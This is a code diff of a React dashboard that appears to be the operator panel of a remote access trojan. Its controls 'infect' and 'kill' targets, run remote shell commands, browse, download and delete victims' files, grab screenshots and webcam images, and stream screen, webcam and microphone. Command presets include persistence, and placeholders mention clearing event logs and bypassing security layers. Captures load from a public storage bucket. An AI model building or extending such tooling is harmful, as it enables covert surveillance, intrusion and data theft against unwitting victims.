-                    <MessageSquare size={20} className="text-green-400 group-hover/btn:scale-110 transition-transform" />
-                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Infect</span>
-                  </button>
-                  <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
-                    <Terminal size={20} className="text-white group-hover/btn:scale-110 transition-transform" />
-                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Shell</span>
-                  </button>
-                  <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setActiveModal('saved_commands'); }} className="flex flex-col items-center justify-center gap-3 p-4 bg-white/5 hover:bg-white/10 rounded-[1.5rem] border border-white/5 transition-all group/btn">
-                    <Settings size={20} className="text-gray-500 group-hover/btn:scale-110 transition-transform" />
-                    <span className="text-[8px] font-black uppercase tracking-widest text-gray-600">Config</span>
-                  </button>
+                    ))}
+                  </div>
+                  <div className="mt-4 flex gap-2">
+                    <button onClick={() => deletePc(pc.id)} className="flex-1 h-9 bg-white/5 hover:bg-red-950 hover:text-red-500 border border-white/5 rounded-xl text-[9px] font-black uppercase transition-all flex items-center justify-center gap-2"><Trash2 size={12}/> Kill Target</button>
+                    <button className="w-9 h-9 bg-white/5 hover:bg-primary hover:text-white border border-white/5 rounded-xl transition-all flex items-center justify-center"><MoreVertical size={16}/></button>
+                  </div>
                 </div>
               </div>
             );
@@ -417,209 +287,318 @@ export default function Dashboard() {
         </div>
       </main>
 
-      {/* Modals Container */}
-      <div className="modals">
-        {/* Explorer */}
-        {activeModal === 'explorer' && (
-          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
-            <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden w-full max-w-6xl shadow-2xl flex flex-col h-[85vh]">
-               <div className="p-8 border-b border-white/5 flex justify-between items-center bg-white/5">
-                  <div className="flex items-center gap-5">
-                    <Folder className="text-yellow-500" size={32} />
-                    <div>
-                      <h3 className="text-xl font-black text-white uppercase tracking-tighter">Unified Storage Explorer</h3>
-                      <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mt-1">Remote Access: {selectedPcName}</p>
+      {/* UNIFIED MODAL SYSTEM */}
+      {activeModal && (
+        <div className="fixed inset-0 z-[1000] flex items-center justify-center p-6 animate-in fade-in duration-300">
+          <div className="absolute inset-0 bg-black/90 backdrop-blur-xl" onClick={() => setActiveModal(null)}></div>
+          
+          <div className="w-full max-w-6xl bg-[#0c0c0c] border border-white/10 rounded-[2.5rem] shadow-[0_0_80px_var(--primary-glow)] relative z-10 flex flex-col h-[85vh] overflow-hidden animate-in slide-in-from-bottom-12 duration-500">
+            {/* MODAL HEADER */}
+            <div className="flex items-center justify-between px-10 py-6 border-b border-white/5 bg-gradient-premium">
+              <div className="flex items-center gap-5">
+                <div className="w-14 h-14 bg-primary rounded-2xl text-white flex items-center justify-center shadow-lg border border-white/10 rotate-3">
+                  {activeModal === 'cmd' && <Terminal size={28} />}
+                  {activeModal === 'explorer' && <Folder size={28} />}
+                  {activeModal === 'screenshot' && <ImageIcon size={28} />}
+                  {activeModal === 'stream' && <Video size={28} />}
+                  {activeModal === 'settings' && <Palette size={28} />}
+                  {activeModal === 'shortcuts' && <Command size={28} />}
+                </div>
+                <div>
+                  <h3 className="text-2xl font-black text-white italic uppercase tracking-tighter leading-none">
+                    {activeModal} <span className="text-primary">SESSION</span>
+                  </h3>
+                  <div className="flex items-center gap-3 mt-1">
+                    <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest flex items-center gap-1.5"><Monitor size={10} /> {selectedPcName || 'HIVE CONTROL'}</span>
+                    <span className="w-1 h-1 bg-gray-700 rounded-full"></span>
+                    <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest flex items-center gap-1.5"><Key size={10} /> {selectedPc || 'ADMIN'}</span>
+                  </div>
+                </div>
+              </div>
+              <div className="flex items-center gap-3">
+                 <button onClick={() => setActiveModal(null)} className="w-12 h-12 flex items-center justify-center bg-white/5 hover:bg-white/10 rounded-2xl text-gray-500 hover:text-white transition-all"><X size={28} /></button>
+              </div>
+            </div>
+
+            {/* MODAL BODY */}
+            <div className="flex-1 flex flex-col overflow-hidden relative">
+              {activeModal === 'cmd' && (
+                <div className="flex-1 flex flex-col bg-black font-mono">
+                  <div className="flex-1 p-8 overflow-y-auto custom-scrollbar text-sm space-y-2">
+                    <div className="flex items-center gap-3 mb-6 p-4 bg-primary/5 border border-primary/10 rounded-2xl">
+                       <Shield className="text-primary" size={16} />
+                       <span className="text-[10px] font-black text-primary uppercase tracking-widest">Secure Tunnel Established. End-to-end encryption active.</span>
+                    </div>
+                    {cmdHistory.map((line, i) => (
+                      <div key={i} className="animate-in fade-in slide-in-from-left-2 duration-300">
+                        {line.startsWith('>') ? (
+                          <div className="flex gap-3 text-primary font-black"><span className="opacity-50">$</span> {line.substring(2)}</div>
+                        ) : (
+                          <div className="text-gray-400 pl-6 leading-relaxed whitespace-pre-wrap">{line}</div>
+                        )}
+                      </div>
+                    ))}
+                  </div>
+                  <div className="p-8 pt-0">
+                    <div className="flex gap-4 items-center bg-white/5 p-5 rounded-3xl border border-white/10 shadow-2xl focus-within:border-primary transition-all">
+                      <span className="text-primary font-black text-xl">#</span>
+                      <input 
+                        type="text" 
+                        className="bg-transparent flex-1 focus:outline-none text-white font-bold text-sm"
+                        placeholder="INPUT SYSTEM COMMAND..."
+                        value={cmdInput}
+                        onChange={e => setCmdInput(e.target.value)}
+                        onKeyDown={e => {
+                          if (e.key === 'Enter' && cmdInput.trim()) {
+                            setCmdHistory([...cmdHistory, '> ' + cmdInput]);
+                            sendCommand(selectedPc!, 'shell', cmdInput);
+                            setCmdInput('');
+                          }
+                        }}
+                      />
+                      <button className="p-3 bg-primary rounded-xl text-white shadow-lg"><MousePointer2 size={18} /></button>
                     </div>
                   </div>
-                  <button onClick={() => setActiveModal(null)} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-400 transition-all"><X size={24} /></button>
-               </div>
-               <div className="bg-[#111] p-4 flex gap-4 items-center px-10 border-b border-white/5">
-                  <button onClick={() => { const parts = explorerPath.split('\\').filter(Boolean); if (parts.length > 1) { parts.pop(); fetchFiles(parts.join('\\') + (parts.length === 1 ? '\\' : '')); } }} className="p-3 bg-white/5 rounded-xl text-white"><ChevronRight className="rotate-180" size={20} /></button>
-                  <input type="text" value={explorerPath} onChange={e=>setExplorerPath(e.target.value)} onKeyDown={e=>e.key==='Enter' && fetchFiles(explorerPath)} className="flex-1 bg-black rounded-xl border border-white/10 px-6 py-3 text-sm font-mono text-gray-300" />
-                  <button onClick={() => fetchFiles(explorerPath)} className={`p-3 bg-white/5 rounded-xl text-blue-400 ${isExplorerLoading ? 'animate-spin' : ''}`}><RefreshCw size={20} /></button>
-               </div>
-               <div className="flex-1 overflow-y-auto p-10 custom-scrollbar grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-6">
-                  {isExplorerLoading ? <div className="col-span-full h-full flex flex-col items-center justify-center gap-6 opacity-20"><RefreshCw size={64} className="animate-spin" /><span className="font-black uppercase tracking-[0.4em]">Optimizing I/O Stream...</span></div> : 
-                    explorerFiles.map((f, i) => (
-                      <div key={i} className="group bg-white/5 border border-white/5 p-6 rounded-[2rem] flex flex-col items-center text-center gap-3 cursor-pointer hover:bg-white/10 hover:border-white/20 transition-all" onDoubleClick={() => f.isDir ? fetchFiles(explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + f.name) : null}>
-                        {f.isDir ? <Folder size={48} className="text-yellow-500 fill-yellow-500/20" /> : <FileText size={48} className="text-blue-500/40" />}
-                        <span className="text-[10px] font-black text-gray-300 uppercase truncate w-full">{f.name}</span>
-                        {!f.isDir && <div className="flex gap-2 mt-2">
-                           <button onClick={() => { const full = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + f.name; sendCommand(selectedPc!, 'dl', full); }} className="p-2 bg-green-500/10 text-green-500 rounded-lg"><Download size={14} /></button>
-                           <button onClick={() => { if(confirm('Delete?')){ const full = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + f.name; sendCommand(selectedPc!, 'rm', full); setTimeout(()=>fetchFiles(explorerPath), 2000); }}} className="p-2 bg-red-500/10 text-red-500 rounded-lg"><Trash2 size={14} /></button>
-                        </div>}
+                </div>
+              )}
+
+              {(activeModal === 'screenshot' || activeModal === 'webcam') && (
+                <div className="flex-1 flex flex-col overflow-hidden bg-black/40">
+                  <div className="p-8 border-b border-white/5 flex justify-between items-center bg-white/5">
+                    <div className="flex items-center gap-4">
+                      <div className="p-3 bg-primary/20 rounded-xl text-primary border border-primary/20">
+                         {activeModal === 'screenshot' ? <Monitor size={24} /> : <Camera size={24} />}
                       </div>
-                    ))
-                  }
-               </div>
+                      <div>
+                        <h4 className="text-xl font-black text-white italic tracking-tighter uppercase">{activeModal} <span className="text-primary">GALLERY</span></h4>
+                        <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Captured from Hive Node: {selectedPcName}</p>
+                      </div>
+                    </div>
+                    <button 
+                      onClick={() => sendCommand(selectedPc!, activeModal === 'screenshot' ? 'ss' : 'webcam')} 
+                      className={`px-6 py-3 bg-primary hover:bg-primary/80 rounded-2xl text-white text-[10px] font-black uppercase flex items-center gap-2 shadow-lg transition-all active:scale-95 ${isCapturing ? 'opacity-50 pointer-events-none' : ''}`}
+                    >
+                      <RefreshCw size={16} className={isCapturing ? 'animate-spin' : ''} /> {isCapturing ? 'CAPTURING...' : 'NEW CAPTURE'}
+                    </button>
+                  </div>
+                  <div className="flex-1 overflow-y-auto p-10 custom-scrollbar">
+                    {isCapturing && mediaItems.length === 0 ? (
+                      <div className="flex flex-col items-center justify-center h-full gap-5">
+                         <div className="relative">
+                            <div className="w-20 h-20 border-4 border-primary/20 border-t-primary rounded-full animate-spin"></div>
+                            <div className="absolute inset-0 flex items-center justify-center"><Activity size={24} className="text-primary animate-pulse" /></div>
+                         </div>
+                         <span className="text-xs font-black uppercase tracking-[0.3em] text-primary animate-pulse">Requesting Hardware Access...</span>
+                      </div>
+                    ) : mediaItems.length > 0 ? (
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
+                        {mediaItems.map((url, i) => (
+                          <div key={i} className="group relative glass rounded-3xl overflow-hidden border-white/5 hover:border-primary/40 transition-all shadow-2xl">
+                             <div className="absolute top-4 left-4 z-10 px-3 py-1 bg-black/60 backdrop-blur-md rounded-lg text-[9px] font-black text-white border border-white/10 uppercase tracking-widest">
+                                {activeModal === 'screenshot' ? `MONITOR ${i + 1}` : `WEBCAM ${i + 1}`}
+                             </div>
+                             <div className="aspect-video bg-black flex items-center justify-center overflow-hidden cursor-zoom-in" onClick={() => setZoomedMedia(`https://erowwdiqlooseyvenesd.supabase.co/storage/v1/object/public/kerchak-assets/${url}`)}>
+                                <img 
+                                  src={`https://erowwdiqlooseyvenesd.supabase.co/storage/v1/object/public/kerchak-assets/${url}`} 
+                                  alt="Remote Capture" 
+                                  className="w-full h-full object-contain group-hover:scale-105 transition-transform duration-700"
+                                />
+                             </div>
+                             <div className="p-4 bg-white/5 flex justify-between items-center">
+                                <span className="text-[10px] font-mono text-gray-500 uppercase">{url.split('_').pop()}</span>
+                                <button className="p-2 hover:bg-primary/20 rounded-lg text-gray-400 hover:text-primary transition-all"><Download size={16} /></button>
+                             </div>
+                          </div>
+                        ))}
+                      </div>
+                    ) : (
+                      <div className="flex flex-col items-center justify-center h-full gap-4 text-gray-700">
+                        <ImageIcon size={64} className="opacity-10" />
+                        <span className="text-xs font-bold uppercase tracking-widest">No captures available in this session.</span>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              )}
+
+              {(activeModal === 'screenshot' || activeModal === 'webcam') && (
+                <div className="flex-1 flex flex-col overflow-hidden bg-black/40 animate-in fade-in duration-500">
+                  <div className="p-10 border-b border-white/5 flex justify-between items-center bg-white/5 relative overflow-hidden">
+                    <div className="absolute inset-0 bg-gradient-to-r from-primary/5 to-transparent pointer-events-none"></div>
+                    <div className="flex items-center gap-6 relative z-10">
+                      <div className="w-16 h-16 bg-primary/20 rounded-[1.5rem] text-primary flex items-center justify-center border border-primary/20 shadow-[0_0_20px_var(--primary-glow)]">
+                         {activeModal === 'screenshot' ? <Monitor size={32} /> : <Camera size={32} />}
+                      </div>
+                      <div>
+                        <h4 className="text-3xl font-black text-white italic tracking-tighter uppercase leading-none">{activeModal} <span className="text-primary">GALLERY</span></h4>
+                        <p className="text-[10px] text-gray-500 font-bold uppercase tracking-[0.3em] mt-2">Captured from hive node: {selectedPcName}</p>
+                      </div>
+                    </div>
+                    <button 
+                      onClick={() => sendCommand(selectedPc!, activeModal === 'screenshot' ? 'ss' : 'webcam')} 
+                      className={`px-8 py-4 bg-primary hover:bg-primary/80 rounded-2xl text-white text-xs font-black uppercase flex items-center gap-3 shadow-2xl transition-all active:scale-95 ${isCapturing ? 'opacity-50 pointer-events-none' : ''}`}
+                    >
+                      <RefreshCw size={18} className={isCapturing ? 'animate-spin' : ''} /> {isCapturing ? 'ACQUIRING...' : 'NEW SESSION'}
+                    </button>
+                  </div>
+                  <div className="flex-1 overflow-y-auto p-10 custom-scrollbar">
+                    {isCapturing && mediaItems.length === 0 ? (
+                      <div className="flex flex-col items-center justify-center h-full gap-8">
+                         <div className="relative">
+                            <div className="w-24 h-24 border-[6px] border-primary/10 border-t-primary rounded-full animate-spin"></div>
+                            <div className="absolute inset-0 flex items-center justify-center"><Activity size={32} className="text-primary animate-pulse" /></div>
+                         </div>
+                         <div className="text-center">
+                            <span className="text-sm font-black uppercase tracking-[0.4em] text-primary animate-pulse block">Accessing Peripheral Hardware...</span>
+                            <span className="text-[10px] font-bold text-gray-600 uppercase tracking-widest mt-2 block">Bypassing localized security layers...</span>
+                         </div>
+                      </div>
+                    ) : mediaItems.length > 0 ? (
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
+                        {mediaItems.map((url, i) => (
+                          <div key={url + i} className="group relative glass rounded-[2.5rem] overflow-hidden border-white/5 hover:border-primary/40 transition-all shadow-[0_20px_50px_rgba(0,0,0,0.5)]">
+                             <div className="absolute top-6 left-6 z-10 px-4 py-1.5 bg-black/70 backdrop-blur-xl rounded-xl text-[10px] font-black text-white border border-white/10 uppercase tracking-[0.2em] shadow-xl">
+                                {activeModal === 'screenshot' ? `MONITOR_${i + 1}` : `CAMERA_FEED_${i + 1}`}
+                             </div>
+                             <div className="aspect-video bg-black/40 flex items-center justify-center overflow-hidden cursor-zoom-in" onClick={() => setZoomedMedia(`https://erowwdiqlooseyvenesd.supabase.co/storage/v1/object/public/kerchak-assets/${url}`)}>
+                                <img 
+                                  src={`https://erowwdiqlooseyvenesd.supabase.co/storage/v1/object/public/kerchak-assets/${url}`} 
+                                  alt="Remote Hardware Capture" 
+                                  className="w-full h-full object-contain group-hover:scale-110 transition-all duration-1000 ease-out"
+                                />
+                                <div className="absolute inset-0 bg-primary/10 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
+                                   <Maximize2 size={48} className="text-white drop-shadow-2xl translate-y-4 group-hover:translate-y-0 transition-all duration-500" />
+                                </div>
+                             </div>
+                             <div className="p-6 bg-white/5 border-t border-white/5 flex justify-between items-center">
+                                <div className="flex flex-col">
+                                   <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Capture ID</span>
+                                   <span className="text-xs font-mono font-bold text-white opacity-50">{url.substring(0, 12)}...</span>
+                                </div>
+                                <div className="flex gap-3">
+                                   <button className="w-11 h-11 bg-white/5 hover:bg-primary/20 rounded-xl text-gray-500 hover:text-primary transition-all flex items-center justify-center"><Download size={20} /></button>
+                                   <button className="w-11 h-11 bg-white/5 hover:bg-red-600/20 rounded-xl text-gray-500 hover:text-red-500 transition-all flex items-center justify-center"><Trash2 size={20} /></button>
+                                </div>
+                             </div>
+                          </div>
+                        ))}
+                      </div>
+                    ) : (
+                      <div className="flex flex-col items-center justify-center h-full gap-6 text-gray-800">
+                        <div className="w-24 h-24 bg-white/5 rounded-[2rem] flex items-center justify-center border border-white/5">
+                           <ImageIcon size={48} className="opacity-10" />
+                        </div>
+                        <span className="text-xs font-black uppercase tracking-[0.3em] opacity-30">No intelligence gathered in current session.</span>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              )}
+
+              {activeModal === 'settings' && (
+                <div className="flex-1 p-10 overflow-y-auto custom-scrollbar bg-black/40">
+                  <h4 className="text-3xl font-black text-white italic tracking-tighter mb-10">SYSTEM <span className="text-primary">OVERRIDE</span></h4>
+                  <div className="max-w-2xl space-y-10">
+                     <section>
+                        <h5 className="text-xs font-black text-gray-500 uppercase tracking-widest mb-6 flex items-center gap-3"><Palette size={16} /> Dashboard Identity</h5>
+                        <div className="flex flex-wrap gap-4">
+                           {['#ff0000', '#22c55e', '#3b82f6', '#a855f7', '#eab308', '#ec4899', '#06b6d4', '#f97316'].map(color => (
+                              <button 
+                                key={color} 
+                                onClick={() => setAccentColor(color)}
+                                className={`w-14 h-14 rounded-2xl border-4 transition-all hover:scale-110 shadow-lg ${accentColor === color ? 'border-white' : 'border-white/5'}`}
+                                style={{ backgroundColor: color }}
+                              />
+                           ))}
+                        </div>
+                     </section>
+                     
+                     <section>
+                        <h5 className="text-xs font-black text-gray-500 uppercase tracking-widest mb-6 flex items-center gap-3"><Settings size={16} /> Hive Configuration</h5>
+                        <div className="grid grid-cols-2 gap-6">
+                           <div className="space-y-2">
+                              <label className="text-[10px] font-bold text-gray-600 uppercase tracking-widest ml-1">Communication Protocol</label>
+                              <div className="bg-black border border-white/10 rounded-2xl p-4 text-xs font-bold text-white flex justify-between items-center cursor-pointer hover:border-primary/50 transition-all">
+                                 SECURE_HTTPS_V2
+                                 <ChevronDown size={14} className="text-primary" />
+                              </div>
+                           </div>
+                           <div className="space-y-2">
+                              <label className="text-[10px] font-bold text-gray-600 uppercase tracking-widest ml-1">Polling Interval</label>
+                              <div className="bg-black border border-white/10 rounded-2xl p-4 text-xs font-bold text-white flex justify-between items-center cursor-pointer hover:border-primary/50 transition-all">
+                                 1.0 SEC (AGGRESSIVE)
+                                 <ChevronDown size={14} className="text-primary" />
+                              </div>
+                           </div>
+                        </div>
+                     </section>
+                  </div>
+                </div>
+              )}
             </div>
           </div>
-        )}
+        </div>
+      )}
 
-        {/* Multi-Monitor Screenshot */}
-        {activeModal === 'screenshot' && (
-          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
-             <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden w-full max-w-7xl shadow-2xl flex flex-col h-[90vh]">
-                <div className="p-8 border-b border-white/5 flex justify-between items-center">
-                   <div>
-                      <h3 className="text-2xl font-black text-white uppercase tracking-tighter">Multi-Display Relay</h3>
-                      <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mt-1">Satellite Feed: {selectedPcName}</p>
-                   </div>
-                   <div className="flex gap-4">
-                      <button onClick={() => takeScreenshot(selectedPc!)} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-blue-500 transition-all"><RefreshCw size={24} /></button>
-                      <button onClick={() => setActiveModal(null)} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-400 transition-all"><X size={24} /></button>
-                   </div>
+      {/* SHORTCUT REGISTER POPUP OVERHAUL */}
+      {isAddingShortcut && (
+        <div className="fixed inset-0 z-[2000] flex items-center justify-center p-4">
+          <div className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={() => setIsAddingShortcut(false)}></div>
+          <div className="w-full max-w-lg bg-[#111] border border-white/10 rounded-[2.5rem] p-10 relative z-10 shadow-[0_0_100px_rgba(0,0,0,0.5)] animate-in zoom-in duration-300">
+            <h4 className="text-2xl font-black text-white italic mb-8 tracking-tighter uppercase">REGISTER <span className="text-primary">COMMAND</span></h4>
+            <div className="space-y-6">
+              <div>
+                <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-3 block ml-1">Command Alias</label>
+                <div className="bg-black border border-white/10 rounded-2xl px-5 py-4 flex items-center gap-3 focus-within:border-primary transition-all">
+                   <Star size={16} className="text-gray-700" />
+                   <input type="text" id="s_name" placeholder="E.g. Clear Event Logs" className="w-full bg-transparent text-sm font-bold focus:outline-none text-white" />
                 </div>
-                <div className="flex-1 overflow-y-auto p-10 custom-scrollbar grid grid-cols-1 xl:grid-cols-2 gap-10">
-                   {!screenshots.length ? <div className="col-span-full h-full flex flex-col items-center justify-center gap-6 opacity-20"><Camera size={80} className="animate-pulse" /><span className="font-black uppercase tracking-[0.4em]">Syncing Display Buffers...</span></div> : 
-                      screenshots.map((s, i) => (
-                        <div key={i} className="relative group rounded-[2.5rem] overflow-hidden border border-white/10 bg-black shadow-2xl">
-                           <div className="absolute top-6 left-6 z-10 px-4 py-2 bg-black/60 backdrop-blur-xl rounded-2xl border border-white/10 text-[9px] font-black text-white uppercase tracking-widest">DISPLAY SOURCE #{i+1}</div>
-                           <img src={s} className="w-full object-contain cursor-zoom-in transition-transform duration-700 hover:scale-[1.02]" onClick={() => setZoomedScreenshot(i)} alt="SS" />
-                        </div>
-                      ))
-                   }
-                </div>
-             </div>
-          </div>
-        )}
-
-        {zoomedScreenshot !== null && (
-          <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/98 backdrop-blur-3xl p-4 cursor-zoom-out" onClick={() => setZoomedScreenshot(null)}>
-            <img src={screenshots[zoomedScreenshot]} className="max-w-full max-h-full rounded-3xl shadow-2xl border border-white/10" alt="Zoom" />
-          </div>
-        )}
-
-        {/* Shortcuts / Saved Commands */}
-        {activeModal === 'saved_commands' && (
-          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
-             <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden w-full max-w-4xl shadow-2xl flex flex-col h-[70vh]">
-                <div className="p-8 border-b border-white/5 flex justify-between items-center">
-                   <h3 className="text-2xl font-black text-white uppercase tracking-tighter">Command Presets</h3>
-                   <button onClick={() => setActiveModal(null)} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-400 transition-all"><X size={24} /></button>
-                </div>
-                <div className="flex-1 p-8 overflow-y-auto custom-scrollbar grid grid-cols-1 md:grid-cols-2 gap-6">
-                   {savedCommands.map(sc => (
-                      <div key={sc.id} className="p-6 bg-white/5 border border-white/5 rounded-[2rem] flex flex-col gap-4 hover:border-red-500/30 transition-all group">
-                         <div className="flex justify-between items-center">
-                            <h4 className="font-black text-white uppercase tracking-tight group-hover:text-red-500 transition-colors">{sc.name}</h4>
-                            <div className="flex gap-2">
-                               <button onClick={() => { if(selectedPc) sendCommand(selectedPc, sc.cmd, sc.args); }} className="p-3 bg-green-500/10 text-green-500 rounded-xl"><Play size={16} /></button>
-                               <button onClick={() => deleteSavedCommand(sc.id)} className="p-3 bg-red-500/10 text-red-500 rounded-xl"><Trash2 size={16} /></button>
-                            </div>
-                         </div>
-                         <code className="text-[9px] font-mono text-gray-600 truncate bg-black/50 p-2 rounded-lg">{sc.cmd} {sc.args}</code>
-                      </div>
-                   ))}
-                   <button onClick={() => setIsCreatingCommand(true)} className="p-10 border-2 border-dashed border-white/5 rounded-[2rem] flex flex-col items-center justify-center gap-4 text-gray-600 hover:text-red-500 hover:border-red-500/30 transition-all">
-                      <Plus size={48} />
-                      <span className="text-[10px] font-black uppercase tracking-widest">Deploy New Preset</span>
-                   </button>
-                </div>
-             </div>
-
-             {/* New Shortcut Popup */}
-             {isCreatingCommand && (
-               <div className="fixed inset-0 z-[110] flex items-center justify-center bg-black/60 backdrop-blur-md p-4">
-                  <div className="w-full max-w-lg bg-[#0c0c0c] border border-red-500/30 rounded-[3rem] p-10 shadow-2xl animate-in zoom-in-95 duration-300">
-                     <div className="flex justify-between items-center mb-10">
-                        <h3 className="text-2xl font-black text-white uppercase tracking-tighter">Logic Designer</h3>
-                        <button onClick={() => setIsCreatingCommand(false)} className="text-gray-500 hover:text-white"><X size={24} /></button>
-                     </div>
-                     <div className="space-y-6">
-                        <div className="space-y-2"><label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Display Name</label><input type="text" value={newCmd.name} onChange={e=>setNewCmd({...newCmd, name:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white focus:outline-none focus:border-red-600 transition-all" /></div>
-                        <div className="space-y-2"><label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Base Protocol</label><select value={newCmd.cmd} onChange={e=>setNewCmd({...newCmd, cmd:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white focus:outline-none focus:border-red-600"><option value="">Select Protocol...</option><option value="cmd">CMD</option><option value="startup">Persistence</option><option value="restart">Power Cycle</option><option value="chat_open">Comms</option></select></div>
-                        <div className="space-y-2"><label className="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-2">Logic Arguments</label><textarea value={newCmd.args} onChange={e=>setNewCmd({...newCmd, args:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-2xl px-6 py-4 text-white font-mono text-xs focus:outline-none focus:border-red-600 h-32" /></div>
-                        <button onClick={saveCommand} className="w-full py-5 bg-red-600 hover:bg-red-500 text-white font-black rounded-2xl shadow-xl transition-all uppercase tracking-widest text-xs flex items-center justify-center gap-3"><Save size={18} /> Compile Preset</button>
-                     </div>
-                  </div>
-               </div>
-             )}
-          </div>
-        )}
-
-        {/* Live Stream / Camera / Chat Modals... (omitted for brevity but updated to new style if they follow) */}
-        {activeModal === 'stream' && (
-          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
-             <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden w-full max-w-6xl shadow-2xl flex flex-col h-[85vh]">
-                <div className="p-8 border-b border-white/5 flex justify-between items-center">
-                   <h3 className="text-2xl font-black text-white uppercase tracking-tighter">Visual Relay <span className="theme-accent text-sm ml-4">[{streamMode}]</span></h3>
-                   <div className="flex gap-4">
-                      <div className="flex bg-white/5 p-2 rounded-2xl border border-white/5">
-                        <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'screen')} className={`px-4 py-2 text-[9px] font-black rounded-xl transition-all ${streamMode === 'screen' ? 'bg-red-600 text-white' : 'text-gray-500'}`}>SCREEN</button>
-                        <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'webcam')} className={`px-4 py-2 text-[9px] font-black rounded-xl transition-all ${streamMode === 'webcam' ? 'bg-purple-600 text-white' : 'text-gray-500'}`}>WEBCAM</button>
-                        <button onClick={() => startLiveStream(selectedPc!, selectedPcName!, 'mic')} className={`px-4 py-2 text-[9px] font-black rounded-xl transition-all ${streamMode === 'mic' ? 'bg-blue-600 text-white' : 'text-gray-500'}`}>VOICE</button>
-                      </div>
-                      <button onClick={() => { if(meteredMeeting) meteredMeeting.leaveMeeting(); setActiveModal(null); }} className="p-4 bg-white/5 hover:bg-white/10 rounded-2xl text-gray-400 transition-all"><X size={24} /></button>
-                   </div>
-                </div>
-                <div className="flex-1 p-10 flex flex-wrap gap-8 items-center justify-center overflow-y-auto" id="stream-container">
-                   <div id="stream-loading" className="flex flex-col items-center gap-6 opacity-20"><RefreshCw size={64} className="animate-spin" /><span className="font-black uppercase tracking-[0.4em]">Opening Visual Link...</span></div>
-                </div>
-             </div>
-          </div>
-        )}
-
-        {/* Settings Modal (Theme Customizer) */}
-        {activeModal === 'settings' && (
-          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-3xl p-6">
-             <div className="bg-[#0c0c0c] border border-white/10 rounded-[3rem] p-12 max-w-xl w-full shadow-2xl relative">
-                <button onClick={() => setActiveModal(null)} className="absolute top-8 right-8 text-gray-500 hover:text-white"><X size={24} /></button>
-                <h3 className="text-3xl font-black text-white uppercase tracking-tighter mb-10">Environment Settings</h3>
-                <div className="space-y-8">
-                   <div className="space-y-4">
-                      <label className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Primary Identity Color</label>
-                      <div className="flex gap-4">
-                         {['#dc2626', '#2563eb', '#16a34a', '#9333ea', '#ca8a04', '#0891b2'].map(color => (
-                            <button key={color} onClick={() => { setThemeColor(color); localStorage.setItem('kerchak_theme', color); }} className="w-12 h-12 rounded-2xl transition-all hover:scale-110 active:scale-95 border-2" style={{ backgroundColor: color, borderColor: themeColor === color ? 'white' : 'transparent' }}></button>
-                         ))}
-                      </div>
-                   </div>
-                   <div className="p-6 bg-white/5 rounded-2xl border border-white/5 flex items-center justify-between">
-                      <span className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Software Version</span>
-                      <span className="text-xs font-black text-white">v3.0.0-PRO_BUILD</span>
-                   </div>
-                </div>
-             </div>
-          </div>
-        )}
-      </div>
-
-      {/* Terminal View */}
-      {showTerminal && (
-        <div className="fixed inset-0 z-[200] bg-black/95 backdrop-blur-3xl flex items-center justify-center p-8">
-           <div className="w-full max-w-6xl h-[80vh] bg-[#0c0c0c] border border-white/10 rounded-[3rem] overflow-hidden flex flex-col shadow-2xl">
-              <div className="p-6 border-b border-white/5 flex justify-between items-center">
-                 <div className="flex items-center gap-4 text-xs font-black uppercase tracking-widest text-red-500">
-                    <Terminal size={20} /> Remote Shell Connection: {activePC}
-                 </div>
-                 <button onClick={() => setShowTerminal(false)} className="p-3 bg-white/5 hover:bg-white/10 rounded-xl text-gray-500"><X size={20} /></button>
               </div>
-              <div className="flex-1 p-10 overflow-y-auto custom-scrollbar font-mono text-sm space-y-2">
